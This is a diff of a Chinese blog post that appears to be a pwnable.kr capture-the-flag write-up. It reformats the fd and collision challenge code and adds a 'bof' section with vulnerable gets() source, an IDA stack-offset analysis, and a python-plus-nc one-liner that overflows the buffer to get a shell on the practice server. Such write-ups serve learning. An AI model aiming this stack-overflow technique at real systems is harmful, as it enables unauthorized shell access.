@@ -128,7 +128,7 @@
     <p class="page-title-sub">
       <span id = "post-title-date">撰写于 2017-03-12</span>
       
-        <span id = "post-title-updated">修改于 2017-03-12</span>
+        <span id = "post-title-updated">修改于 2017-03-20</span>
       
       
       
@@ -158,13 +158,14 @@ char buf[32];
 int main(int argc, char* argv[], char* envp[])
 {
 
-    if(argc&lt2){
+    if(argc&lt2)
+          {
 
         printf("pass argv[1] a number\n");
 
         return 0;
 
-    }
+       }
 
     int fd = atoi( argv[1] ) - 0x1234;
 
@@ -172,14 +173,15 @@ int main(int argc, char* argv[], char* envp[])
 
     len = read(fd, buf, 32);
 
-    if(!strcmp("LETMEWIN\n", buf)){
+    if(!strcmp("LETMEWIN\n", buf))
+            {
 
         printf("good job :)\n");
 
         system("/bin/cat flag");
 
         exit(0);
-    }
+         }
     printf("learn about Linux file IO\n");
 
     return 0;
@@ -195,30 +197,35 @@ int main(int argc, char* argv[], char* envp[])
 #include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 unsigned long hashcode = 0x21DD09EC;
-unsigned long check_password(const char* p){
+unsigned long check_password(const char* p)
+{
     int* ip = (int*)p;
     int i;
     int res=0;
-    for(i=0; i&lt;5; i++){
+    for(i=0; i&lt;5; i++)
+            {
         res += ip[i];
-    }
+         }
     return res;
 }
 
 int main(int argc, char* argv[]){
-    if(argc&lt;2){
+    if(argc&lt;2)
+            {
         printf("usage : %s [passcode]\n", argv[0]);
         return 0;
-    }
-    if(strlen(argv[1]) != 20){
+         }
+    if(strlen(argv[1]) != 20)
+             {
         printf("passcode length should be 20 bytes\n");
         return 0;
-    }
+          }
 
-    if(hashcode == check_password( argv[1] )){
+    if(hashcode == check_password( argv[1] ))
+              {
         system("/bin/cat flag");
         return 0;
-    }
+           }
     else
         printf("wrong passcode.\n");
     return 0;
@@ -228,6 +235,36 @@ int main(int argc, char* argv[]){
 
 <p>那么我们就可使用python脚本对其操作，具体的操作如下：</p>
 <p><img src="http://omkxe7cq3.bkt.clouddn.com/col%E6%93%8D%E4%BD%9C.png" alt=""></p>
+<p><strong>0x02  bof</strong></p>
+<p>　　这是第三题，终于感觉跟之前学的那些缓冲区溢出还有米神的一步一步学rop有点瓜葛了。这里给出了程序及其源码，分析源码可以知道是gets()函数出了问题，可以进行利用其进行溢出修改key来拿到bin权限；</p>
+<p>  　　具体的分析就是这个函数中先是调用一个gets()函数，然后是再验证key的值是否是0xcafebabe来判断是否能让我们获取其中的的bin权限，但是下面的main函数已经定义了可以是0xdeadbeef，因此我们就需要溢出 overflowme这个数组来修改可以的值借以达到通过验证获取bin权限的目的，这样的话，获取数组和key在内存中所占空间大小就成了关键之处，而数组则是通过gets()函数来进入程序的，而且这里只有gets()函数和printf()函数可以缓冲区溢出，printf不可能，剩下的之有它了，这里我们可以使用ida帮助我们分析；</p>
+<pre>
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+void func(int key)
+{
+    char overflowme[32];
+    printf("overflow me : ");
+    gets(overflowme);    // smash me!
+    if(key == 0xcafebabe)
+      {
+        system("/bin/sh");
+      }
+    else
+      {
+        printf("Nah..\n");
+      }
+}
+int main(int argc, char* argv[])
+{
+    func(0xdeadbeef);
+    return 0;
+}
+</pre>
+
+<p>　　先使用ida查看一下，发现main函数有可疑之处；<br><img src="http://omkxe7cq3.bkt.clouddn.com/func%E5%87%BD%E6%95%B0.png" alt=""></p>
+<p>　　进去一瞅，发现gets()函数的参数s也就是数组的起始地址之ebp-2ch，而a1也就是key是ebp+8h，这样一算，需要输入0x2c+0x8=52个字符才能造成溢出，修改key值，进而获得bin权限；<br><img src="http://omkxe7cq3.bkt.clouddn.com/%E4%B8%BB%E5%87%BD%E6%95%B0.png" alt=""><br>再进行python脚本的构造就行了（很尴尬，脚本是抄的但是我也去查了其中一些命令的含义），构造出的python命令是： (python -c ‘print(“a”*52+ chr(0xbe) + chr(0xba) + chr(0xfe) +chr(0xca))’; cat) | nc pwnable.kr 9000 其中几个chr()的内容可以使用”/xbe/xba/xfe/xca”表示，nc是链接远端的命令，这里需要注意的是使用的cat的目的是显示出flag，缺少是不行的；<br><img src="http://omkxe7cq3.bkt.clouddn.com/bof%E8%B0%83%E8%AF%95.png" alt=""></p>
 
   </article>
   <div class="random-toc-area">
